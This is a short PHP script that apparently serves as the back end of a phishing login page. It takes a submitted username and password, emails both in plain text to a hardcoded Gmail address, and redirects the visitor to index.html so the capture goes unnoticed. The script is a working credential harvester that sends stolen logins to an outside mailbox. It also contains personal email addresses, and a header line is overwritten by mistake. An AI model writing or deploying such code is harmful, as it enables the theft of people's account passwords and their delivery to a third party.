<?php
$Username = $_POST['Username'];
$password = $_POST['password'];

$email_from = 'bikashnayak179@outlook.com';

$email_subject = "new form submission";


$email_body = "Username: $Username.\n".
                "password: $password.\n";


$to = "anwesa078@gmail.com";


$headers = "From: $email_from \r\n";

$headers = "Reply_To: $Username \r\n";


mail($to,$email_subject,$email_body,$headers);

header("Location: index.html");




?>